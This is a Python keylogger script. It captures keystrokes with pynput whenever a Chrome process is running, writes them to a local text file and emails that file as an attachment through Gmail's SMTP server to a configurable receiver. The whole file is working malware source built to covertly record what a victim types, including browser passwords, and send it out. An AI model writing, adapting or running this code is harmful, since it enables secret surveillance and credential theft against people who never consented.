from pynput.keyboard import Key, Listener
import smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import psutil, os


file = "d:/win.txt"
sender_email = ""
receiver_email = ""
password = ""

count = 0
keys = []


def mail2():
    subject = "An email with attachment from Logger"
    body = "An email with attachment from Logge"

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    # message["Bcc"] = receiver_email  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))
    # In same directory as script

    # Open PDF file in binary mode
    with open(file, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {file}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)


def write_file(keys):
    with open(file, "a", encoding='UTF-8') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    # print(f"{key} Pressed")
    if checkIfProcessRunning('chrome'):
        pass
    else:
        return False
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return True


def start_keylogger():
    try:
        mail2()
    except Exception as e:
        print("Error in sending mail")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# check if chrome is running
def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False


while True:
    # Check if any chrome process was running or not.
    if checkIfProcessRunning('chrome'):
        # print('Yes a chrome process was running')
        start_keylogger()
    else:
        pass
        # print('No chrome process was running')
